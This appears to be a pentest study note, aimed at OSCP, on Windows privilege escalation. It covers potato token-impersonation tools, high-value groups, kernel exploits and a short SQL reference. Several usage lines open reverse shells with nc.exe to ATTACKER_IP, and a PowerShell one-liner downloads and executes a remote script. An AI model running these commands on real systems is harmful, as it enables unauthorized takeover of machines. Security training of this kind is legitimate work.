# Windows Privilege Escalation Reference

Extended reference for Windows privesc. For core commands and checklist, see [[Windows Privilege Escalation]] and [[CHECKLIST-Windows-Privesc]].

## Token Impersonation Tools Comparison

**SweetPotato (Recommended - Most Compatible):**
- Works: Windows 7-11, Server 2008-2022
- Most reliable for OSCP
- Usage: `.\SweetPotato.exe -p .\nc.exe -a "IP PORT -e cmd.exe"`

**PrintSpoofer (Server 2016/2019):**
- More stable on newer Windows Server
- Requires Print Spooler service running
- Usage: `.\PrintSpoofer64.exe -i -c "whoami"`

**RoguePotato (Windows 10 1809+, Server 2019+):**
- Newer systems only
- Usage: `.\RoguePotato.exe -r ATTACKER_IP -e "C:\nc.exe ATTACKER_IP PORT -e cmd.exe" -l 9999`

**JuicyPotato (Older Windows):**
- Windows 7, 8, Server 2008, 2012
- Requires specific CLSID for OS version
- Usage: `.\JuicyPotato.exe -l 1337 -p c:\windows\system32\cmd.exe -a "/c whoami" -t *`

## Privilege Groups

**High Value Groups:**
- Administrators (full system access)
- Backup Operators (can backup/restore files - bypass ACLs)
- Remote Desktop Users (RDP access)
- Remote Management Users (WinRM access)

## Kernel Exploits (Last Resort)

**Only use as last resort due to crash risk:**
- MS16-032 (Secondary Logon Handle)
- MS17-010 (EternalBlue)
- CVE-2020-0796 (SMBGhost)
- CVE-2021-1675 (PrintNightmare)

Check `systeminfo` output against Windows Exploit Suggester.

## PowerShell Execution Policy Bypass

```powershell
powershell -ep bypass
powershell -ExecutionPolicy Bypass -File script.ps1
powershell -c "IEX(New-Object Net.WebClient).DownloadString('http://IP/script.ps1')"
```

## Database Syntax Quick Reference

**MySQL/MariaDB:**
```sql
SHOW DATABASES;
USE database_name;
SHOW TABLES;
SELECT * FROM table_name;
```

**MSSQL:**
```sql
SELECT name FROM sys.databases;
USE database_name;
SELECT * FROM INFORMATION_SCHEMA.TABLES;
SELECT * FROM table_name;
```

**SQLite:**
```bash
sqlite3 database.db
.databases
.tables
SELECT * FROM table_name;
```

## Resources

- PowerSploit: https://github.com/PowerShellMafia/PowerSploit
- PEASS-ng WinPEAS: https://github.com/carlospolop/PEASS-ng
- HackTricks Windows PrivEsc: https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation
- PayloadsAllTheThings: https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md
- LOLBAS Project: https://lolbas-project.github.io/
- Potato Exploits Guide: https://jlajara.gitlab.io/Potatoes_Windows_Privesc
